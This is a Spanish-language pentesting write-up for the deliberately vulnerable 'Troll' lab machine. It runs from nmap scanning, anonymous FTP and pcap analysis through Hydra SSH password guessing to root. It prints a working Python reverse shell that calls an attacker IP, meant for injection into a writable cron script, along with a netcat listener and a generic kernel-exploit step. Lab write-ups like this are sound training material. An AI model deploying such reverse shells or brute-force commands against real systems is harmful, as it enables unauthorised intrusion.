# Troll1

![imagen](https://github.com/90l3m0np13/Troll1/blob/main/Portada_LoL.jpeg)
#  Aprendiendo Pentesting: Resolución Práctica de la Máquina Troll


# Resolución de la Máquina Troll

Este documento describe el proceso paso a paso para resolver la máquina virtual "Troll". A continuación, se detallan las acciones realizadas para identificar vulnerabilidades, explotarlas y obtener acceso como usuario root.

---

## 1. Escaneo Inicial

Realizamos un escaneo de la red para identificar la IP de la máquina, los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -p- <IP_de_la_máquina>
```

### Puertos y Servicios Abiertos:
- **21/tcp**: FTP (vsftpd 3.0.2)
- **22/tcp**: SSH (OpenSSH 6.6.1p1)
- **80/tcp**: HTTP (Apache httpd 2.4.7)

---

## 2. Identificación de Vulnerabilidades

Exploramos posibles vulnerabilidades en los servicios identificados, consultando bases de datos como [CVE](https://cve.mitre.org/).

---

## 3. Acceso al Servicio FTP

Accedemos al servicio FTP utilizando el usuario `anonymous` sin contraseña.

```bash
ftp <IP_de_la_máquina>
```

### Archivo Encontrado:
- **lol.pcap**: Un archivo de captura de red que analizamos con Wireshark.

---

## 4. Análisis del Archivo `lol.pcap`

Descargamos el archivo `lol.pcap` a nuestra máquina local y lo abrimos con Wireshark.

```bash
get lol.pcap
```

### Pista Encontrada:
- En una transferencia de FTP-DATA, encontramos un nombre de usuario: `sup3rs3cr3tdirlol`.

---

## 5. Exploración del Servicio Web

Accedemos a la ruta web asociada al usuario encontrado:

  ![imagen](https://github.com/90l3m0np13/Troll1/blob/main/LoL.png) 
```
http://<IP_de_la_máquina>/sup3rs3cr3tdirlol
```

### Archivo Descubierto:
- **roflmao**: Un archivo oculto que contiene la pista `Find address <Pista>`.

---

## 6. Enumeración de Usuarios y Contraseñas

En la misma ruta web, encontramos dos carpetas:

1. **good_luck**: Contiene un listado de usuarios registrados en la máquina.
2. **this_folder_contains_the_password**: Contiene un archivo con una posible contraseña.

### Uso de Hydra:
Utilizamos Hydra para probar la contraseña encontrada con los usuarios listados.

```bash
hydra -L users.txt -p "contraseña_encontrada" <IP_de_la_máquina> ssh
```

---

## 7. Acceso SSH

Una vez identificado el usuario válido, accedemos a la máquina mediante SSH.

```bash
ssh "usuario"@<IP_de_la_máquina>
```

---

## 8. Escalada de Privilegios

### Método 1: Explotación de un Script Python

1. Identificamos un script en Python (`cleaner.py`) que se ejecuta periódicamente y es modificable.
2. Insertamos una reverse shell en el script.

```python
# Reverse Shell en Python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP_atacante>",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

3. Ponemos en escucha Netcat en nuestra máquina.

```bash
nc -lvp 4242
```

4. Cuando el script se ejecute, obtendremos una shell como root.

### Método 2: Uso de un Exploit de Escalada de Privilegios

1. Buscamos un exploit para la versión de Ubuntu de la máquina.
2. Compilamos y ejecutamos el exploit.

```bash
gcc exploit.c -o exploit
./exploit
```

---

## 9. Obtención de la Flag

Una vez como root, buscamos el archivo `proof.txt` que contiene la flag.

```bash
ls /root
cat /root/proof.txt
```

---

## Referencias

- [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)
- [Exploit Database](https://www.exploit-db.com)



